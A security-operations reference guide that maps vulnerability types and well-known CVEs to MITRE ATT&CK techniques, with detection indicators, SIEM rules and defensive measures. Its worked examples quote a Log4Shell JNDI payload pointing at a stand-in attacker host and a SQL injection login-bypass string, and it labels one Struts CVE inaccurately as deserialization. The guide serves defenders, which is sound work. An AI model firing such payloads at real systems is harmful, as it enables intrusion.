# MITRE ATT&CK Mapping Guide for Vulnerability Analysis

## Introduction

### What is MITRE ATT&CK?

The MITRE ATT&CK framework is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides a common language for understanding cyber adversary behavior.

**Framework Structure:**
- **Tactics** = "Why" - The adversary's tactical objectives (e.g., Initial Access, Execution, Privilege Escalation)
- **Techniques** = "How" - The specific methods adversaries use to achieve tactical goals (each has a T-number, e.g., T1190)

**Reference:** https://attack.mitre.org

### Purpose of This Guide

This guide helps security analysts map vulnerabilities (CVEs) to ATT&CK tactics and techniques to:
- **Understand attack paths**: How vulnerabilities enable adversary progression
- **Prioritize detection**: Focus monitoring on techniques enabled by critical vulnerabilities
- **Enrich analysis**: Add tactical context to vulnerability assessments
- **Support remediation**: Align patching with defensive monitoring capabilities

**Scope:** This guide focuses on vulnerability exploitation patterns relevant to enterprise security operations. It is not a comprehensive ATT&CK reference.

---

## Common Tactics for Vulnerability Types

### Tactic: Initial Access (TA0001)

**Definition:** Adversaries gain initial entry into the network through vulnerable systems.

**Common Vulnerability Types:**
- Remote Code Execution (RCE) in public-facing applications
- SQL Injection in web applications
- Authentication bypass vulnerabilities
- Unrestricted file upload vulnerabilities
- Unpatched VPN/remote access services

**Example CVEs:**
- CVE-2021-44228 (Log4Shell) - RCE in logging library
- CVE-2019-0708 (BlueKeep) - RCE in Windows RDP
- CVE-2017-0144 (EternalBlue) - RCE in Windows SMB

---

### Tactic: Execution (TA0002)

**Definition:** Adversaries run malicious code on compromised systems.

**Common Vulnerability Types:**
- Remote Code Execution (RCE)
- Command injection vulnerabilities
- Deserialization vulnerabilities
- Server-Side Template Injection (SSTI)
- Script injection (XSS in certain contexts)

**Example CVEs:**
- CVE-2014-6271 (Shellshock) - Command injection in Bash
- CVE-2017-5638 (Apache Struts RCE) - Deserialization vulnerability
- CVE-2021-3156 (Baron Samedit) - Heap-based buffer overflow in sudo

---

### Tactic: Privilege Escalation (TA0004)

**Definition:** Adversaries gain higher-level permissions on systems or networks.

**Common Vulnerability Types:**
- Local privilege escalation vulnerabilities
- Kernel vulnerabilities (privilege escalation)
- Sudo/setuid misconfigurations
- Container escape vulnerabilities
- Windows token manipulation vulnerabilities

**Example CVEs:**
- CVE-2021-4034 (PwnKit) - Local privilege escalation in polkit
- CVE-2022-0847 (Dirty Pipe) - Linux kernel privilege escalation
- CVE-2020-1472 (Zerologon) - Windows Netlogon privilege escalation

---

### Tactic: Impact (TA0040)

**Definition:** Adversaries disrupt availability or integrity of systems and data.

**Common Vulnerability Types:**
- Denial of Service (DoS) vulnerabilities
- Data destruction vulnerabilities
- Resource exhaustion vulnerabilities
- Crash-inducing vulnerabilities

**Example CVEs:**
- CVE-2021-44832 (Log4j DoS) - Denial of service
- CVE-2018-6789 (Exim DoS) - Remote crash vulnerability

---

## Common Techniques with T-Numbers

### T1190 - Exploit Public-Facing Application

**Description:** Adversaries exploit vulnerabilities in Internet-facing systems to gain initial access.

**Common CVE Types:**
- Web application RCE (Log4Shell, Struts)
- SQL injection in public applications
- Unrestricted file upload
- Authentication bypass in web apps
- API vulnerabilities

**Detection Indicators:**
- Unusual HTTP request patterns (abnormal headers, payloads)
- WAF alerts on exploit attempts
- IDS/IPS signatures matching known exploits
- Error spikes in application logs
- Unexpected outbound connections from web servers

**Defensive Measures:**
- Regular patching of public-facing applications
- Web Application Firewall (WAF) deployment
- Input validation and sanitization
- Network segmentation (DMZ isolation)
- Intrusion Detection/Prevention Systems (IDS/IPS)

**Real-World Example:** CVE-2021-44228 (Log4Shell) - RCE via JNDI lookup in Log4j library

---

### T1068 - Exploitation for Privilege Escalation

**Description:** Adversaries exploit vulnerabilities to gain elevated permissions.

**Common CVE Types:**
- Local privilege escalation (polkit, sudo, kernel)
- Windows privilege escalation (token manipulation, service misconfigurations)
- Container escape vulnerabilities
- Setuid/setgid exploitation

**Detection Indicators:**
- Unexpected process creation by low-privilege users
- Kernel module loading events
- Sudo/polkit authentication failures followed by success
- Process running with unexpected privilege levels
- Changes to sensitive system files (/etc/passwd, /etc/shadow)

**Defensive Measures:**
- Timely patching of OS and kernel vulnerabilities
- Least privilege principles (minimize sudo/admin access)
- Audit logging (auditd, Sysmon)
- Application whitelisting
- Endpoint Detection and Response (EDR) solutions

**Real-World Example:** CVE-2021-4034 (PwnKit) - Local privilege escalation via polkit pkexec

---

### T1059 - Command and Scripting Interpreter

**Description:** Adversaries execute malicious commands via system interpreters (bash, PowerShell, cmd).

**Common CVE Types:**
- Command injection vulnerabilities
- Shell injection in web applications
- OS command injection in APIs
- Script injection vulnerabilities

**Detection Indicators:**
- Unusual command-line arguments (Base64 encoding, obfuscation)
- Process execution chains (parent-child relationships)
- Spawning of shells by web servers or services
- PowerShell/bash execution with network activity
- Encoded or obfuscated scripts

**Defensive Measures:**
- Command-line logging (Sysmon, EDR, auditd)
- Input validation and sanitization
- Disable unnecessary interpreters
- Monitor parent-child process relationships
- Script execution policies (PowerShell Constrained Language Mode)

**Real-World Example:** CVE-2014-6271 (Shellshock) - Command injection via Bash environment variables

---

### T1203 - Exploitation for Client Execution

**Description:** Adversaries exploit client-side vulnerabilities (browsers, PDF readers, Office applications).

**Common CVE Types:**
- Browser vulnerabilities (JavaScript engine, rendering)
- PDF reader exploits (Adobe Reader)
- Office document exploits (macros, OLE objects)
- Email client vulnerabilities

**Detection Indicators:**
- Unexpected process creation from document readers
- Browser crashes followed by unusual activity
- Outbound connections from Office applications
- Suspicious macros or embedded objects
- Sandbox evasion attempts

**Defensive Measures:**
- Browser and application patching
- Disable macros by default
- Email attachment sandboxing
- User awareness training (phishing)
- Protected View in Office applications

**Real-World Example:** CVE-2021-40444 (MSHTML RCE) - Office document exploitation via malicious ActiveX controls

---

### T1210 - Exploitation of Remote Services

**Description:** Adversaries exploit vulnerabilities in network services for lateral movement or initial access.

**Common CVE Types:**
- SMB vulnerabilities (EternalBlue, SMBGhost)
- RDP vulnerabilities (BlueKeep)
- SSH vulnerabilities
- Database vulnerabilities (PostgreSQL, MySQL)

**Detection Indicators:**
- Unusual SMB/RDP traffic patterns
- Authentication failures followed by success
- Exploit-specific network signatures
- Unexpected service restarts
- Lateral movement indicators (Psexec, WMI)

**Defensive Measures:**
- Network segmentation
- Service patching
- Disable unnecessary network services
- Network IDS/IPS monitoring
- Strong authentication (MFA, certificates)

**Real-World Example:** CVE-2017-0144 (EternalBlue) - SMB RCE enabling WannaCry ransomware spread

---

### T1133 - External Remote Services

**Description:** Adversaries exploit vulnerabilities in remote access services (VPN, RDP, SSH).

**Common CVE Types:**
- VPN vulnerabilities (Pulse Secure, Fortinet, Citrix)
- RDP authentication bypass
- SSH vulnerabilities
- Remote desktop protocol exploits

**Detection Indicators:**
- Authentication from unusual geolocations
- VPN connections outside business hours
- Multiple failed authentication attempts
- Exploit-specific signatures
- Unusual remote access patterns

**Defensive Measures:**
- Multi-factor authentication (MFA)
- VPN/remote access patching
- Geo-blocking or IP whitelisting
- Session monitoring and timeouts
- Least privilege access controls

**Real-World Example:** CVE-2019-11510 (Pulse Secure VPN) - Arbitrary file read leading to credential theft

---

### T1498 - Network Denial of Service

**Description:** Adversaries exploit vulnerabilities to disrupt network availability.

**Common CVE Types:**
- Amplification attack vulnerabilities
- Resource exhaustion vulnerabilities
- Crash-inducing network protocol bugs
- Buffer overflow leading to crashes

**Detection Indicators:**
- Network traffic spikes
- Service unavailability or crashes
- Resource exhaustion (CPU, memory, bandwidth)
- Exploit-specific signatures
- Unusual packet patterns

**Defensive Measures:**
- Rate limiting and traffic shaping
- DDoS mitigation services
- Service patching
- Network monitoring and alerting
- Redundancy and failover mechanisms

**Real-World Example:** CVE-2018-6789 (Exim DoS) - Remote crash via buffer overflow

---

## Mapping Examples

### Example 1: Remote Code Execution (RCE) in Web Application

**Scenario:**
- **CVE:** CVE-2021-44228 (Log4Shell)
- **CVSS Score:** 10.0 (Critical)
- **Vulnerability Type:** Remote Code Execution via JNDI injection in Log4j
- **Attack Vector:** Attacker sends malicious JNDI lookup string in HTTP header (e.g., User-Agent)

**ATT&CK Mapping:**
- **Primary Tactic:** Initial Access (TA0001)
- **Primary Technique:** T1190 - Exploit Public-Facing Application
- **Secondary Tactic:** Execution (TA0002)
- **Secondary Technique:** T1059 - Command and Scripting Interpreter (spawns shell)

**Attack Flow:**
1. Attacker identifies public-facing application using Log4j (Initial Access)
2. Sends JNDI payload in HTTP request: `${jndi:ldap://attacker.com/a}` (T1190)
3. Application logs malicious string, triggering Log4j JNDI lookup
4. Log4j fetches and executes malicious Java class from attacker server (Execution)
5. Code executes with application privileges, spawning reverse shell (T1059)

**Detection Implications:**
- **Monitor:** Web application logs for JNDI syntax (`${jndi:`)
- **Tools:** WAF rules for JNDI patterns, IDS/IPS signatures, SIEM correlation
- **Indicators:** Outbound LDAP/RMI connections from web servers, unexpected Java class loading

---

### Example 2: SQL Injection in Database-Driven Application

**Scenario:**
- **CVE:** Generic SQL Injection (SQLi)
- **CVSS Score:** 9.8 (Critical)
- **Vulnerability Type:** SQL Injection in login form
- **Attack Vector:** Attacker injects SQL commands via unvalidated input fields

**ATT&CK Mapping:**
- **Primary Tactic:** Initial Access (TA0001)
- **Primary Technique:** T1190 - Exploit Public-Facing Application
- **Secondary Technique:** T1078 - Valid Accounts (authentication bypass)

**Attack Flow:**
1. Attacker identifies vulnerable login form (Initial Access)
2. Injects SQL payload: `' OR '1'='1' --` to bypass authentication (T1190)
3. Application executes malicious SQL, bypassing authentication
4. Attacker gains access to application with stolen/bypassed credentials (T1078)

**Detection Implications:**
- **Monitor:** Database query logs for SQL syntax anomalies, authentication logs for unusual logins
- **Tools:** WAF SQL injection rules, database activity monitoring, SIEM alerts
- **Indicators:** SQL error messages in logs, authentication from new IP addresses, unusual query patterns

---

### Example 3: Local Privilege Escalation

**Scenario:**
- **CVE:** CVE-2021-4034 (PwnKit)
- **CVSS Score:** 7.8 (High)
- **Vulnerability Type:** Local privilege escalation via polkit pkexec
- **Attack Vector:** Attacker with local access exploits pkexec to gain root privileges

**ATT&CK Mapping:**
- **Primary Tactic:** Privilege Escalation (TA0004)
- **Primary Technique:** T1068 - Exploitation for Privilege Escalation

**Attack Flow:**
1. Attacker has initial local access (low-privilege user)
2. Exploits PwnKit vulnerability in pkexec by manipulating environment variables (T1068)
3. Gains root privileges
4. Can now install persistence, access sensitive data, or escalate attack

**Detection Implications:**
- **Monitor:** Polkit/pkexec execution events, process creation by low-privilege users with unexpected EUID=0
- **Tools:** auditd rules for pkexec, Sysmon process monitoring, EDR alerts
- **Indicators:** pkexec execution with unusual arguments, privilege escalation events, changes to /etc/passwd or /etc/shadow

---

### Example 4: Denial of Service (DoS)

**Scenario:**
- **CVE:** CVE-2018-6789 (Exim DoS)
- **CVSS Score:** 9.8 (Critical - can lead to RCE in some variants)
- **Vulnerability Type:** Buffer overflow causing service crash
- **Attack Vector:** Attacker sends crafted SMTP message to crash Exim server

**ATT&CK Mapping:**
- **Primary Tactic:** Impact (TA0040)
- **Primary Technique:** T1498 - Network Denial of Service

**Attack Flow:**
1. Attacker identifies vulnerable Exim mail server
2. Sends specially crafted SMTP message with oversized base64 payload (T1498)
3. Buffer overflow triggers crash, disrupting email service
4. Repeated exploitation causes sustained service disruption

**Detection Implications:**
- **Monitor:** Exim service crashes, unusual SMTP traffic patterns, memory allocation errors
- **Tools:** Service monitoring, network IDS/IPS, log analysis
- **Indicators:** Service restarts, crash dumps, unusual SMTP message sizes, resource exhaustion

---

### Example 5: Authentication Bypass

**Scenario:**
- **CVE:** CVE-2020-1472 (Zerologon)
- **CVSS Score:** 10.0 (Critical)
- **Vulnerability Type:** Authentication bypass in Windows Netlogon
- **Attack Vector:** Attacker exploits cryptographic flaw to authenticate as domain controller

**ATT&CK Mapping:**
- **Primary Tactic:** Initial Access (TA0001) or Privilege Escalation (TA0004) depending on context
- **Primary Technique:** T1190 - Exploit Public-Facing Application (if DC exposed) or T1068 (if local network)
- **Secondary Technique:** T1078 - Valid Accounts (bypassed authentication)

**Attack Flow:**
1. Attacker on network sends Netlogon authentication requests with zero-value credentials (T1190/T1068)
2. Cryptographic flaw allows authentication bypass
3. Attacker authenticates as domain controller (T1078)
4. Can change domain admin passwords, escalate to full domain compromise

**Detection Implications:**
- **Monitor:** Netlogon authentication events (Event ID 4742), unusual DC authentication patterns
- **Tools:** Windows Event Log monitoring, SIEM correlation, EDR
- **Indicators:** Netlogon authentication from unexpected sources, password changes on sensitive accounts, domain controller impersonation

---

## Detection Implications per Technique

### T1190 - Exploit Public-Facing Application

**What to Monitor:**
- Web server access logs (unusual HTTP methods, abnormal payloads, exploit signatures)
- WAF alerts (SQL injection, XSS, RCE attempts, JNDI patterns)
- Application error logs (stack traces, exceptions, crashes)
- Outbound network connections from web servers (reverse shells, C2 beaconing)
- Process creation events on web servers (shells spawned by www-data, apache, nginx)

**IDS/IPS Signatures:**
- Snort/Suricata rules for known exploits (Log4Shell, Struts, SQL injection)
- Custom signatures for application-specific vulnerabilities
- Generic exploit detection (shellcode, obfuscation patterns)

**Log Analysis Patterns:**
- HTTP status codes: Spikes in 500 errors (application crashes), 200 followed by unusual behavior
- User-Agent anomalies (scanner signatures, exploit tools)
- Request size anomalies (oversized headers, payloads)
- Geographic anomalies (requests from unexpected countries)

**SIEM Correlation Rules:**
- WAF alert + outbound connection from web server = potential RCE
- Application error + process creation (shell) = exploitation attempt
- Multiple exploit attempts + successful request = compromise indicator

**Defensive Recommendations:**
- Deploy and tune Web Application Firewall (WAF)
- Enable verbose application logging
- Implement network segmentation (DMZ for public-facing apps)
- Regular vulnerability scanning and patching
- Runtime Application Self-Protection (RASP) for critical applications

---

### T1068 - Exploitation for Privilege Escalation

**What to Monitor:**
- Process creation events (especially with privilege changes: EUID=0, SeDebugPrivilege)
- Authentication logs (sudo, polkit, UAC elevation)
- Kernel module loading events
- File system modifications to sensitive files (/etc/passwd, /etc/shadow, SAM database)
- Registry changes (Windows privilege escalation via registry)

**IDS/IPS Signatures:**
- Exploit-specific signatures (PwnKit, Dirty Pipe, PrintNightmare)
- Unusual system call patterns (kernel exploitation)

**Log Analysis Patterns:**
- auditd (Linux): `type=EXECVE` for unexpected commands with `uid=0`
- Sysmon (Windows): Process creation with `IntegrityLevel=High` from low-privilege parent
- Authentication logs: Repeated failures followed by success
- Kernel logs: Oops, panics, unexpected module loads

**SIEM Correlation Rules:**
- Low-privilege user + process creation as root/SYSTEM = privilege escalation
- Failed authentication attempts + successful privilege elevation = exploitation
- File modification (/etc/passwd, registry) + no corresponding admin activity = compromise

**Defensive Recommendations:**
- Deploy Endpoint Detection and Response (EDR) solutions
- Enable detailed process logging (auditd, Sysmon)
- Monitor authentication events (sudo, polkit, UAC)
- Least privilege principles (minimize sudo/admin access)
- Kernel hardening (SELinux, AppArmor, grsecurity)
- Regular OS and kernel patching

---

### T1059 - Command and Scripting Interpreter

**What to Monitor:**
- Command-line logging (full arguments, obfuscation detection)
- Process parent-child relationships (web server spawning bash/cmd)
- PowerShell Script Block Logging (script content, encoded commands)
- Bash history and command execution
- Interpreter execution by unusual processes (Office, browser, web server)

**IDS/IPS Signatures:**
- Shellshock exploitation patterns
- PowerShell download cradles (`Invoke-WebRequest`, `DownloadString`)
- Base64-encoded commands
- Known malicious scripts (Empire, Cobalt Strike)

**Log Analysis Patterns:**
- Command-line obfuscation (Base64, hex encoding, string concatenation)
- Network activity from interpreters (curl, wget, Invoke-WebRequest in scripts)
- Unusual parent processes (nginx/apache spawning bash, winword.exe spawning powershell)
- Suspicious arguments (`-EncodedCommand`, `eval`, `exec`, `IEX`)

**SIEM Correlation Rules:**
- Web server + shell execution + outbound connection = web shell or RCE
- PowerShell + encoded command + network activity = potential C2 communication
- Office application + script execution = macro-based attack

**Defensive Recommendations:**
- Enable command-line logging (Sysmon, auditd, EDR)
- PowerShell Constrained Language Mode (restrict script capabilities)
- Application whitelisting (prevent unauthorized script execution)
- Monitor and alert on suspicious command patterns
- Disable unnecessary interpreters (restrict PowerShell versions, remove unused shells)
- Input validation and sanitization in applications

---

### T1203 - Exploitation for Client Execution

**What to Monitor:**
- Browser and application crash logs
- Process creation from document readers (Adobe, Office, browsers)
- Outbound network connections from client applications
- File system changes (downloads, temporary files, auto-start locations)
- Memory corruption indicators (heap spraying, ROP chains)

**IDS/IPS Signatures:**
- Exploit kit signatures (Angler, RIG, Magnitude)
- Malicious document patterns (embedded Flash, OLE objects, macros)
- Browser exploitation indicators (heap spray, use-after-free)

**Log Analysis Patterns:**
- Browser crashes followed by unusual process creation
- Office applications spawning cmd.exe, powershell.exe
- Unexpected network connections from PDF readers, Office apps
- Registry changes (Office macro settings, browser extensions)

**SIEM Correlation Rules:**
- Document open + process creation (script/shell) = exploitation
- Browser crash + outbound connection = drive-by download
- Email attachment + Office process + script execution = phishing

**Defensive Recommendations:**
- Keep browsers and client applications patched
- Email attachment sandboxing and analysis
- Disable macros by default (Office Protected View)
- Browser isolation (virtual browsers, containerization)
- User awareness training (recognize phishing, suspicious documents)
- EDR monitoring for client-side exploitation

---

### T1210 - Exploitation of Remote Services

**What to Monitor:**
- SMB/RDP/SSH authentication events (failures, unusual sources)
- Network service logs (crash events, authentication bypass)
- Lateral movement indicators (Psexec, WMI, remote service creation)
- Network traffic patterns (port scans, exploit attempts)
- Service restarts and crashes

**IDS/IPS Signatures:**
- EternalBlue (MS17-010), SMBGhost (CVE-2020-0796)
- BlueKeep (CVE-2019-0708) exploitation
- SSH vulnerability exploits
- Database exploitation (PostgreSQL, MySQL, MSSQL)

**Log Analysis Patterns:**
- Authentication failures followed by success (brute force + exploitation)
- Service crashes correlated with network activity
- Unusual SMB/RDP connections (internal lateral movement)
- Remote service creation or modification

**SIEM Correlation Rules:**
- Network scan + service exploitation attempt + authentication = reconnaissance + attack
- SMB vulnerability signature + lateral movement = worm-like propagation
- Service crash + authentication from same source = exploitation attempt

**Defensive Recommendations:**
- Network segmentation (limit SMB/RDP exposure)
- Patch remote services promptly (SMB, RDP, SSH)
- Disable SMBv1 (vulnerable protocol version)
- Network IDS/IPS deployment
- Strong authentication (SSH keys, MFA for RDP)
- Monitor lateral movement patterns

---

### T1133 - External Remote Services

**What to Monitor:**
- VPN authentication logs (geo-location, unusual times)
- Remote access logs (RDP, SSH, Citrix)
- Multi-factor authentication (MFA) events (bypass attempts, unusual patterns)
- Account activity after remote authentication
- Session durations and data transfer volumes

**IDS/IPS Signatures:**
- VPN exploitation signatures (Pulse Secure, Fortinet, Citrix vulnerabilities)
- RDP brute force detection
- SSH authentication anomalies

**Log Analysis Patterns:**
- Geographic anomalies (login from impossible locations)
- Time anomalies (access outside business hours)
- Credential stuffing patterns (multiple failed authentications)
- MFA bypass or push notification fatigue attacks

**SIEM Correlation Rules:**
- VPN login from new geo-location + privileged access = potential compromise
- Failed MFA + successful login = MFA bypass
- Remote access + unusual internal activity = post-exploitation

**Defensive Recommendations:**
- Enforce multi-factor authentication (MFA) for all remote access
- Patch VPN and remote access services immediately
- Geo-blocking or IP whitelisting (restrict access to known locations)
- Session monitoring and anomaly detection
- Least privilege access (limit what remote users can access)
- Regular security audits of remote access configurations

---

### T1498 - Network Denial of Service

**What to Monitor:**
- Network traffic volume (bandwidth utilization)
- Service availability metrics (uptime, response times)
- Resource utilization (CPU, memory, network connections)
- Service crash logs and restart events
- Inbound traffic patterns (amplification attacks, packet floods)

**IDS/IPS Signatures:**
- DDoS attack signatures (SYN flood, UDP flood, HTTP flood)
- Amplification attack patterns (DNS, NTP, memcached)
- Exploit-specific DoS signatures

**Log Analysis Patterns:**
- Traffic spikes from specific sources
- Service unavailability correlating with network activity
- Resource exhaustion events (out of memory, connection limits)
- Crash dumps indicating exploit-induced failures

**SIEM Correlation Rules:**
- Traffic spike + service unavailability = DoS attack
- Multiple sources + similar traffic patterns = DDoS
- Exploit signature + service crash = vulnerability exploitation

**Defensive Recommendations:**
- DDoS mitigation services (Cloudflare, Akamai, AWS Shield)
- Rate limiting and traffic shaping
- Network capacity planning and over-provisioning
- Service patching (eliminate DoS vulnerabilities)
- Redundancy and failover mechanisms
- Network monitoring and automated alerting

---

## Quick Reference Table

| CVE Type | Primary Tactic | Primary Technique | Detection Focus | Key Tools |
|----------|----------------|-------------------|-----------------|-----------|
| **Web App RCE** | Initial Access | T1190 - Exploit Public-Facing Application | WAF alerts, unusual HTTP traffic, outbound connections | WAF, IDS/IPS, SIEM |
| **SQL Injection** | Initial Access | T1190 - Exploit Public-Facing Application | SQL syntax in logs, authentication anomalies | WAF, Database monitoring, SIEM |
| **Command Injection** | Execution | T1059 - Command and Scripting Interpreter | Shell execution by web servers, command-line obfuscation | Auditd, Sysmon, EDR |
| **Local Priv Esc** | Privilege Escalation | T1068 - Exploitation for Privilege Escalation | Process creation with elevated privileges, sudo events | Auditd, Sysmon, EDR |
| **Kernel Vulnerability** | Privilege Escalation | T1068 - Exploitation for Privilege Escalation | Kernel module loading, authentication escalation | Auditd, kernel logs, EDR |
| **Browser Exploit** | Execution | T1203 - Exploitation for Client Execution | Browser crashes, unusual process creation | EDR, browser logs, sandboxing |
| **Office Exploit** | Execution | T1203 - Exploitation for Client Execution | Macros, Office spawning scripts, outbound connections | EDR, email gateway, sandbox |
| **SMB Vulnerability** | Initial Access / Lateral Movement | T1210 - Exploitation of Remote Services | SMB authentication, lateral movement, service crashes | Network IDS, Sysmon, SIEM |
| **RDP Vulnerability** | Initial Access | T1210 - Exploitation of Remote Services | RDP authentication, unusual connections | Network IDS, Windows logs, SIEM |
| **VPN Vulnerability** | Initial Access | T1133 - External Remote Services | VPN logs, geo-location anomalies, MFA events | VPN logs, SIEM, MFA logs |
| **SSH Vulnerability** | Initial Access | T1210 - Exploitation of Remote Services | SSH authentication, unusual sources | SSH logs, auditd, SIEM |
| **DoS Vulnerability** | Impact | T1498 - Network Denial of Service | Traffic spikes, service crashes, resource exhaustion | Network monitoring, IDS, service logs |
| **Auth Bypass** | Initial Access | T1190 + T1078 - Exploit + Valid Accounts | Authentication logs, unusual access patterns | SIEM, authentication logs, EDR |
| **Deserialization** | Execution | T1059 - Command and Scripting Interpreter | Unusual object creation, code execution from data | Application logs, EDR, RASP |

---

## Integration with Vulnerability Assessment Workflow

When analyzing a CVE, use this mapping process:

1. **Identify Vulnerability Type** (RCE, SQLi, privilege escalation, DoS, etc.)
2. **Map to Primary Tactic** (Initial Access, Execution, Privilege Escalation, Impact)
3. **Map to Primary Technique** (T1190, T1068, T1059, T1203, T1210, T1133, T1498)
4. **Identify Secondary Techniques** (exploitation often enables multiple techniques)
5. **Review Detection Implications** (what to monitor for this technique)
6. **Prioritize Detection** (align with CVSS + EPSS + KEV risk assessment from Story 4.1)

**Example Workflow:**
- CVE-2021-44228 (Log4Shell) identified with CVSS 10.0, EPSS 97%, KEV listed
- Map to T1190 (public-facing RCE) + T1059 (shell execution)
- Detection: WAF rules for JNDI, IDS signatures, outbound LDAP monitoring
- Remediation: Patch Log4j, deploy WAF rules, monitor web server process creation
- Result: Reduced detection time from hours to minutes via targeted monitoring

---

## Authoritative References

- **MITRE ATT&CK Framework:** https://attack.mitre.org
- **ATT&CK for Enterprise:** https://attack.mitre.org/matrices/enterprise/
- **Technique Descriptions:** https://attack.mitre.org/techniques/
- **NIST CVE Database:** https://nvd.nist.gov/vuln
- **CISA Known Exploited Vulnerabilities (KEV):** https://www.cisa.gov/known-exploited-vulnerabilities-catalog

---

**Document Version:** 1.0
**Last Updated:** 2025-11-07
**Maintained By:** Security Operations Team
